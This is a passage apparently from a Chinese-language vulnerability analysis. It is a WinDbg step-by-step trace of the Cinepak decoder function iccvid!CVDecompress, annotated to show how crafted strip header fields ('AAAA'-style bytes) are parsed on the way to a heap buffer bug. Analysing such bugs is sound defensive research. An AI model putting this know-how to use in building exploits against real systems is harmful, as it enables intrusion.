class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc3</span>:</span><br><span class="line">73b72271 3c11            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">11h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72273 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc5</span>:</span><br><span class="line">73b72273 0f8557010000    <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x222</span> (73b723d0)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000011</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72279 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcb</span>:</span><br><span class="line">73b72279 8d4508          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]                                    <span class="comment">; eax = 0x025afd38,a1地址,a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xce</span>:</span><br><span class="line">73b7227c <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg3 = eax = 0x025afd38,保存Size of strip data减去Strip Header大小后的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227d <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcf</span>:</span><br><span class="line">73b7227d 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span>                                            <span class="comment">; arg2 = 0xC,Strip Header大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227f <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd1</span>:</span><br><span class="line">73b7227f ff75f8          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; arg1 = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72282 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd4</span>:</span><br><span class="line">73b72282 e8fffeffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出Size of strip data减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72287 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd9</span>:</span><br><span class="line">73b72287 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72289 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xdb</span>:</span><br><span class="line">73b72289 0f8c65010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7228f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe1</span>:</span><br><span class="line">73b7228f 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = eax^eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72291 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe3</span>:</span><br><span class="line">73b72291 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba692a=<span class="number">41</span> <span class="comment">; ah = 0x41,Strips bottom Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72294 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe6</span>:</span><br><span class="line">73b72294 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72296 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe8</span>:</span><br><span class="line">73b72296 8a6e04          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">4</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6926=<span class="number">41</span> <span class="comment">; ch = 0x41,Strips top Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004100</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72299 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xeb</span>:</span><br><span class="line">73b72299 8a4609          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">9</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba692b=<span class="number">41</span> <span class="comment">; al = 0x41,Strips bottom Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004100</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xee</span>:</span><br><span class="line">73b7229c 8a4e05          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">5</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6927=<span class="number">41</span> <span class="comment">; cl = 0x41,Strips top Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004141</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf1</span>:</span><br><span class="line">73b7229f 2bc1            <span class="keyword">sub</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                        <span class="comment">; (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf3</span>:</span><br><span class="line">73b722a1 660faf432e      <span class="keyword">imul</span>    <span class="built_in">ax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">2Eh</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:001535de=<span class="number">0001</span> <span class="comment">; ebx = a1 = 0x001535b0,[(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf8</span>:</span><br><span class="line">73b722a6 89450c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">00000000</span> <span class="comment">; a2 = eax = 0x00000000 = [(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span> <span class="comment">; </span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfb</span>:</span><br><span class="line">73b722a9 8b45fc          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00004000</span> <span class="comment">; eax = [ebp-4] = 0x4000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfe</span>:</span><br><span class="line">73b722ac 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断局部变量[ebp-4]是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ae <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x100</span>:</span><br><span class="line">73b722ae <span class="number">7421</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 为0则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x102</span>:</span><br><span class="line">73b722b0 807d1300        <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">13h</span>],<span class="number">0</span>       <span class="built_in">ss</span>:<span class="number">0023</span>:025afd43=<span class="number">00</span> <span class="comment">; 判断a3(Len_of_CVID_data)的最高字节是否为0,Frame Header的Flags</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x106</span>:</span><br><span class="line">73b722b4 751b            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不相等则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x108</span>:</span><br><span class="line">73b722b6 803e11          <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="number">11h</span>         <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6922=<span class="number">11</span> <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00004000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6922 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span 